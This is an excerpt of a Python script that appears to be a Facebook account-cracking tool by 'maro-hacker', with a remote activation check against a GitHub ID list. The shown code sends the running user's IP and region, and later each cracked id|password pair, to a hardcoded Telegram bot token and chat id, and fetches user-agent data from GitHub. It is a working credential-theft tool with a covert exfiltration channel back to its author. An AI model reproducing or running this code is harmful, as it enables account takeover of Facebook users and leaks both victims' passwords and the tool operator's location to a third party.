...
gep = requests.get('https://ipinfo.io/json').json()
token = "2005370068:AAGEkt2qCMjb5ECcbYSKecRppJmEW7Y9nxA"
id = "1287436097"
requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text= ip : {ip} \n [Region] : %s "%gep['region'])
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
...
def I():
    ...
    if id in requests.get("https://raw.githubusercontent.com/maro-hacker/Crackng_FB/main/ID.txt").text:
        print("\033[92m YOUR ID IS ACTIVE .....")
        time.sleep(1)
        pass
    else:
        print("\033[91m BO ACTIVE KRDNE IDYAKAT NAMA BNERA @i4m_maro")
        os.system('xdg-open https://t.me/i4m_maro')
...
try:
	...
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96m1778')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/maro-hacker/MARO_TOO').text
		ua=open('.bbnew.txt','w')
...
def chk():
  ...
  try: 
    ...
    httpCaht = requests.get("https://raw.githubusercontent.com/maro-hacker/Crackng_FB/main/ID.txt").text 
    ...
    if id in httpCaht: 
      ...
      print("\033[0;96m BO ID ACTIVE KRDN @i4m_maro") 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					requests.get(f"https://api.telegram.org/bot2005370068:AAGEkt2qCMjb5ECcbYSKecRppJmEW7Y9nxA/sendMessage?chat_id=1287436097&text=\n{idf}|{pw} ")
					print(f'\r{H}\n█▓ 𝐌𝐀𝐑𝐎\n█▓ 𝐈𝐃: {idf}\n█▓ 𝐏𝐀𝐒𝐒 : {pw}\n')
